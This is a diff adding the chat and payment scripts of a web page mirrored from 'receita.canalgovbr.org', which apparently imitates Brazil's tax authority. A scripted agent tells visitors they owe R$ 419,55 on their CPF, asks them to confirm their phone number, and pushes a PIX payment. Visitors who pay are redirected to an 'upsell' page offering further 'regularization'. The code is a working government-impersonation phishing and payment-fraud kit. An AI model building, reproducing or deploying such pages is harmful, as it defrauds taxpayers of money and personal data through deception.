+                : `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF, registrado em seu nome.`;
+            addMessage(primeiraMensagem, true, true);
+            console.log('✅ Mensagem de fallback enviada');
+        } catch (e) {
+            console.error('❌ Erro ao enviar mensagem de fallback:', e);
+        }
+    }
+}
+
+// Global variable to control phone confirmation
+let phoneConfirmationResolve = null;
+
+// Show phone input form
+function showPhoneInput() {
+    // Definir phoneNumber ANTES do try para estar disponível no template string
+    let phoneNumber = '';
+    
+    try {
+        if (!chatContainer) {
+            console.error('❌ chatContainer não encontrado em showPhoneInput');
+            return;
+        }
+        
+        // Verificar se já existe um input de telefone
+        const existingInput = document.querySelector('.phone-input-container');
+        if (existingInput) {
+            console.log('⚠️ Input de telefone já existe, não duplicando');
+            return;
+        }
+        
+        // Get phone from localStorage
+        const currentData = getCustomerData();
+        phoneNumber = formatarTelefone(currentData.telefone || '');
+        
+        if (!phoneNumber) {
+            console.warn('Telefone não encontrado no localStorage');
+            phoneNumber = ''; // Garantir que seja string vazia se não tiver
+        }
+    } catch (error) {
+        console.error('❌ Erro ao preparar input de telefone:', error);
+        phoneNumber = ''; // Garantir que seja string vazia em caso de erro
+    }
+    
+    const phoneInputHtml = `
+        <div class="phone-input-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6;">
+                <label for="phoneInput" style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">
+                    Confirme seu número de telefone (DDD + número):
+                </label>
+                <input 
+                    type="tel" 
+                    id="phoneInput" 
+                    value="${phoneNumber || ''}"
+                    placeholder="(00) 00000-0000"
+                    style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #044785;
+                        border-radius: 4px;
+                        font-size: 1rem;
+                        margin-bottom: 15px;
+                        text-align: center;
+                        font-weight: 600;
+                        background-color: #ffffff;
+                        cursor: text;
+                    "
+                />
+                <button 
+                    onclick="confirmPhone()" 
+                    style="
+                        background: #044785;
+                        color: white;
+                        border: none;
+                        padding: 12px 24px;
+                        border-radius: 4px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        width: 100%;
+                        font-size: 1rem;
+                    "
+                >
+                    Confirmar Telefone
+                </button>
+                <button 
+                    onclick="skipPhoneConfirmation()" 
+                    style="
+                        background: transparent;
+                        color: #044785;
+                        border: 1px solid #044785;
+                        padding: 8px 16px;
+                        border-radius: 4px;
+                        font-weight: 500;
+                        cursor: pointer;
+                        width: 100%;
+                        font-size: 0.9rem;
+                        margin-top: 10px;
+                    "
+                >
+                    Pular e continuar
+                </button>
+            </div>
+        </div>
+    `;
+    
+    try {
+    chatContainer.insertAdjacentHTML('beforeend', phoneInputHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+    } catch (e) {
+        console.error('Erro ao inserir input de telefone:', e);
+    }
+}
+
+// Função para pular confirmação de telefone
+function skipPhoneConfirmation() {
+    try {
+        // Remove phone input form
+        const phoneContainer = document.querySelector('.phone-input-container');
+        if (phoneContainer) {
+            phoneContainer.remove();
+        }
+        
+        // Resolve the promise to continue chat
+        if (phoneConfirmationResolve) {
+            phoneConfirmationResolve();
+            phoneConfirmationResolve = null;
+        }
+        
+        addMessage('Continuando sem confirmar telefone...', false, true);
+    } catch (error) {
+        console.error('❌ Erro ao pular confirmação de telefone:', error);
+        // Resolve mesmo com erro para não travar
+        if (phoneConfirmationResolve) {
+            phoneConfirmationResolve();
+            phoneConfirmationResolve = null;
+        }
+    }
+}
+
+// Wait for phone confirmation - SEM TIMEOUT (aguarda indefinidamente)
+function waitForPhoneConfirmation() {
+    return new Promise(resolve => {
+        console.log('📞 Configurando aguardo de confirmação de telefone...');
+        phoneConfirmationResolve = resolve;
+        
+        // NÃO há timeout - o chat aguardará até o telefone ser confirmado
+        // A Promise só será resolvida quando confirmPhone() ou skipPhoneConfirmation() for chamado
+        console.log('✅ Sistema de aguardo configurado - aguardando confirmação do usuário');
+    });
+}
+
+// Confirm phone number
+async function confirmPhone() {
+    try {
+        // Get phone from input field (user can edit)
+    const phoneInput = document.getElementById('phoneInput');
+        const phoneNumber = phoneInput ? phoneInput.value.trim() : '';
+    
+        if (!phoneNumber) {
+            alert('Por favor, insira seu número de telefone.');
+        return;
+    }
+        
+        // Aceitar qualquer valor de telefone (sem validação)
+        const phoneDigits = phoneNumber.replace(/\D/g, '');
+    
+    // Save phone to localStorage
+        const currentData = getCustomerData();
+        currentData.telefone = phoneDigits;
+        try {
+    localStorage.setItem('customerData', JSON.stringify(currentData));
+            console.log('Telefone salvo no localStorage:', phoneDigits);
+        } catch (e) {
+            console.error('Erro ao salvar telefone no localStorage:', e);
+        }
+    
+    // Add user response to chat
+    addMessage(`Telefone: ${phoneNumber}`, false, true);
+    
+    // Remove phone input form
+    const phoneContainer = document.querySelector('.phone-input-container');
+    if (phoneContainer) {
+        phoneContainer.remove();
+    }
+    
+    // Show typing and thank message
+    await showTyping(3000);
+        addMessage(`Obrigada, ${window.currentFirstName || 'Prezado(a)'}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
+    
+    // Resolve the promise to continue chat
+    if (phoneConfirmationResolve) {
+        phoneConfirmationResolve();
+        phoneConfirmationResolve = null;
+        }
+    } catch (error) {
+        console.error('❌ Erro ao confirmar telefone:', error);
+        alert('Erro ao confirmar telefone. Por favor, tente novamente.');
+    }
+}
+
+// Start chat when page loads
+document.addEventListener('DOMContentLoaded', () => {
+    // Verificar se deve mostrar o PIX automaticamente (retorno da tela de processamento)
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('showPix') === 'true') {
+        // Recuperar transação do localStorage
+        const transaction = JSON.parse(localStorage.getItem('currentTransaction') || '{}');
+        if (transaction.transactionId && transaction.qrCode) {
+            console.log('Mostrando PIX automaticamente após regeneração');
+            setTimeout(() => {
+                if (typeof showPixModal === 'function') {
+                    showPixModal(transaction.qrCode, transaction.pixCode, transaction.transactionId);
+                }
+            }, 1000);
+        }
+    }
+    
+    // Verificar se as mensagens já foram processadas
+    if (window.chatMessagesProcessed) {
+        console.log('⚠️ Mensagens do chat já foram processadas, evitando duplicação');
+        return;
+    }
+    
+    // Aguardar payment-handler.js carregar antes de inicializar (com timeout de segurança)
+    let waitAttempts = 0;
+    const maxWaitAttempts = 50; // 5 segundos máximo (50 * 100ms)
+    
+    function waitForPaymentHandler() {
+        waitAttempts++;
+        
+        if (typeof openPixModal === 'function' && typeof paymentHandler !== 'undefined') {
+            console.log('✅ payment-handler.js carregado - chamando initializeChat()');
+            initializeChat().catch(error => {
+                console.error('❌ Erro ao inicializar chat:', error);
+                // Limpar flag para tentar novamente
+                window.chatProcessing = false;
+                // Tentar inicializar novamente mesmo com erro
+                setTimeout(() => {
+                    try {
+                        console.log('🔄 Tentando inicializar chat novamente após erro...');
+                        initializeChat();
+                    } catch (e) {
+                        console.error('❌ Erro crítico ao inicializar chat:', e);
+                    }
+                }, 1000);
+            });
+        } else if (waitAttempts >= maxWaitAttempts) {
+            console.warn('⏰ Timeout aguardando payment-handler.js, iniciando chat mesmo assim...');
+            // Iniciar chat mesmo sem payment-handler para não travar
+            console.log('🔄 Chamando initializeChat() após timeout...');
+            initializeChat().catch(error => {
+                console.error('❌ Erro ao inicializar chat (sem payment-handler):', error);
+                window.chatProcessing = false;
+            });
+        } else {
+            console.log(`⏳ Aguardando payment-handler.js carregar... (tentativa ${waitAttempts}/${maxWaitAttempts})`);
+            setTimeout(waitForPaymentHandler, 100);
+        }
+    }
+    
+    // Iniciar verificação
+    waitForPaymentHandler();
+    
+    waitForPaymentHandler();
+});
+
+// Function to show manual payment confirmation popup
+function showManualPaymentConfirmation(transactionId) {
+    // Check if PIX modal is still visible
+    const pixModal = document.getElementById('pixModal');
+    if (!pixModal) {
+        console.log('Modal PIX não está mais visível, cancelando popup de confirmação');
+        return;
+    }
+    
+    console.log('⏰ Mostrando popup de confirmação manual após 20 segundos');
+    
+    const confirmationPopup = `
+        <div id="paymentConfirmationPopup" style="
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            z-index: 3000;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: popupFadeIn 0.3s ease-out;
+        ">
+            <h3 style="color: #044785; font-weight: 600; margin-bottom: 20px; font-size: 1.2rem;">
+                Confirmação de Pagamento
+            </h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
+                Você já realizou o pagamento via PIX?
+            </p>
+            <div style="display: flex; gap: 15px; justify-content: center;">
+                <button onclick="handlePaymentConfirmation('${transactionId}', true)" style="
+                    background: #28a745;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Sim
+                </button>
+                <button onclick="handlePaymentConfirmation('${transactionId}', false)" style="
+                    background: #dc3545;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Não
+                </button>
+            </div>
+        </div>
+        <div id="paymentConfirmationOverlay" style="
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 2999;
+        "></div>
+        <style>
+        @keyframes popupFadeIn {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', confirmationPopup);
+}
+
+// Function to handle manual payment confirmation
+async function handlePaymentConfirmation(transactionId, confirmed) {
+    // Remove confirmation popup
+    const popup = document.getElementById('paymentConfirmationPopup');
+    const overlay = document.getElementById('paymentConfirmationOverlay');
+    if (popup) popup.remove();
+    if (overlay) overlay.remove();
+    
+    if (confirmed) {
+        console.log('✅ Usuário confirmou pagamento, verificando status...');
+        
+        try {
+            const statusUrl = `get-payment.php?transactionId=${encodeURIComponent(transactionId)}`;
+            console.log(`🔄 Verificação manual do status via get-payment.php: ${statusUrl}`);
+            
+            const response = await fetch(statusUrl);
+            
+            if (!response.ok) {
+                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+            
+            const statusData = await response.json();
+            console.log('📊 Status da verificação manual:', statusData);
+            
+            // Extrai status como no checkout
+            let status = null;
+            if (Array.isArray(statusData) && statusData.length > 0) {
+                status = statusData[0].status;
+            } else if (statusData && statusData.status) {
+                status = statusData.status;
+            }
+            
+            console.log(`🎯 Status manual normalizado: "${status}"`);
+            
+            if (status === 'approved' || status === 'paid') {
+                // Clear automatic monitoring
+                if (window.paymentMonitorInterval) {
+                    clearInterval(window.paymentMonitorInterval);
+                    window.paymentMonitorInterval = null;
+                }
+                
+                // Close modal
+                closePixModal();
+
+                // Salvar dados da transação no localStorage
+                localStorage.setItem('currentTransaction', JSON.stringify({
+                    transactionId: transactionId,
+                    status: status,
+                    paid: true,
+                    timestamp: new Date().toISOString()
+                }));
+
+                console.log('✅ Pagamento confirmado! Redirecionando para oferta de regularização 2026...');
+                window.location.href = 'upsell.html';
+            } else {
+                console.log('⚠️ Pagamento ainda não foi aprovado');
+                alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
+            }
+        } catch (error) {
+            console.error('❌ Erro ao verificar status manual:', error);
+            alert('Erro ao verificar pagamento. Tente novamente.');
+        }
+    } else {
+        console.log('❌ Usuário informou que não realizou o pagamento');
+        // Continue with automatic monitoring
+    }
+  }
+</script>
+<script>
+// Função para capitalizar nomes
+function capitalizeNames(name) {
+    if (!name || name === 'Cliente' || name === 'Contribuinte') return '';
+    return name.toLowerCase().split(' ').map(word => 
+        word.charAt(0).toUpperCase() + word.slice(1)
+    ).join(' ');
+}
+
+// Function to format CPF: 000.000.000-00
+function formatarCPF(cpf) {
+    if (!cpf) return 'CPF não informado';
+    // Remove all non-numeric characters
+    const cpfLimpo = String(cpf).replace(/\D/g, '');
+    if (cpfLimpo.length !== 11) return cpf; // Return original if invalid length
+    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+// Function to format phone: (00) 00000-0000 or (00) 0000-0000
+function formatarTelefone(telefone) {
+    if (!telefone) return '';
+    // Remove all non-numeric characters
+    const telLimpo = String(telefone).replace(/\D/g, '');
+    
+    // Remove country code 55 if present
+    let tel = telLimpo;
+    if (telLimpo.length >= 12 && telLimpo.startsWith('55')) {
+        tel = telLimpo.substring(2);
+    }
+    
+    // Format based on length
+    if (tel.length === 11) {
+        // Cell phone: (00) 00000-0000
+        return tel.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+    } else if (tel.length === 10) {
+        // Landline: (00) 0000-0000
+        return tel.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
+    }
+    
+    // Return original if format doesn't match
+    return telefone;
+}
+
+// Função iniciarChat removida - usando apenas initializeChat() para evitar duplicação
+</script>
+<!-- Código de reload removido para evitar travamento -->
+
+<!-- Cloudflare Insights scripts removidos para evitar erros 501 -->
+
+
+
+<!-- Sistema de Pagamento InPagamentos -->
+<script src="payment-handler.js"></script>
+
+</body><!-- Mirrored from receita.canalgovbr.org/chat by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:21 GMT --></html>
